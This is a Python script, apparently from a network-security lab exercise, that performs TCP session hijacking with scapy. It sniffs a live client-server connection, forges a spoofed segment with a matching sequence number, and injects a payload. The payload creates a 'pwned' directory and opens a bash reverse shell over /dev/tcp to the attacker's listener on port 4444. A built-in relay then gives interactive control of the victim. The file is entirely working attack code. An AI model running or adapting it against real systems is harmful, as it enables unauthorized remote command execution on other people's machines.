from scapy.all import *
from sys import argv, stdin, stdout
from threading import Thread, Event
import socket
import select

REV_PORT = 4444
_connected = Event()
# dict for handoff between threads (shell waiting -> main thread)
_channel = {}

def get_outbound_ip(target):
    # creates socket via IPv4 UDP
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    probe.connect((target, 9))
    addr = probe.getsockname()[0]
    probe.close()
    return addr

def await_callback():
    # TCP IPv4 listening socket
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # lets the program re-bind port 4444 immediately after restart, for safety
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # claims port 4444 on all local interfaces (to catch host1's callback)
    srv.bind(('0.0.0.0', REV_PORT))
    srv.listen(1)

    conn, peer = srv.accept()
    print(f"Received reverse shell connection from {peer}")
    _channel["sock"] = conn
    _connected.set()

def relay(conn):
    # 2 sources to be monitored for data to be read
    watched = [stdin, conn]
    while True:
        # blocks until one source has data available; we do not care about writes/errors, hence _
        ready, _, _ = select.select(watched, [], [])
        for source in ready:
            if source is conn:
                out = conn.recv(4096)
                if not out:
                    print("\nReverse shell closed")
                    return
                # print host1's output to the screen and prevent a non-UTF-8 byte from crashing the decode
                stdout.write(out.decode(errors="replace"))
                stdout.flush()
            else:
                cmd = stdin.readline()
                if not cmd:
                    return
                conn.sendall(cmd.encode())

def inject_command(src_ip, dst_ip, dst_port):
    attacker = get_outbound_ip(dst_ip)

    # create the directory - proof of hijack
    # start an interactive shell (bash -c '...') whose input/output/errors are redirected
    #   over a TCP connection to us via bash's /dev/tcp builtin
    payload = (
        f"mkdir -p /home/user/pwned; "
        f"bash -c 'bash -i >& /dev/tcp/{attacker}/{REV_PORT} 0>&1' &\n"
    ).encode()

    pkt_filter = f"tcp and src host {src_ip} and dst host {dst_ip} and dst port {dst_port}"
    print("waiting for packet...")

    # loop until host1's reverse shell connects back (a single injection can miss if more data was sent between our capture and send,
    #   invalidating our derived sequence number)
    while not _connected.is_set():
        captured = sniff(filter=pkt_filter, count=1, timeout=8)
        if not captured:
            continue
        tcp = captured[0][TCP]
        consumed = len(tcp.payload)
        # SYN consumes a sequence number
        if tcp.flags & 0x02:
            consumed += 1
        # FIN consumes a sequence number
        if tcp.flags & 0x01:
            consumed += 1
        forged = IP(src=src_ip, dst=dst_ip) / \
                 TCP(sport=tcp.sport,
                     dport=dst_port,
                     # PA = PSH+ACK (pushes the data to the application immediately, instead of buffering)
                     flags="PA",
                     seq=tcp.seq + consumed,
                     ack=tcp.ack) / Raw(load=payload)
        send(forged)
        # wait up to 2 seconds for the shell
        _connected.wait(timeout=2)

def main(src_ip, dst_ip, dst_port):
    conf.verb = 0
    # start the reverse-shell listener
    Thread(target=await_callback, daemon=True).start()
    # actual hijack, sniffs live client->server packets, forges spoofed segment with mkdir+reverse shell and returns when the attack has been executed
    inject_command(src_ip, dst_ip, dst_port)

    # blocks until _connected is set (inside await_callback) - host1 connects back, i.e. the reverse shell is live
    _connected.wait()
    # gives the connected socket to the interactive relay
    relay(_channel["sock"])

if __name__ == "__main__":
    if len(argv) != 4:
        print(f"Usage: python3 {argv[0]} <source_ip> <destination_ip> <destination_port>")
        exit(1)

    src_ip, dst_ip, dst_port = argv[1], argv[2], int(argv[3])
    main(src_ip, dst_ip, dst_port)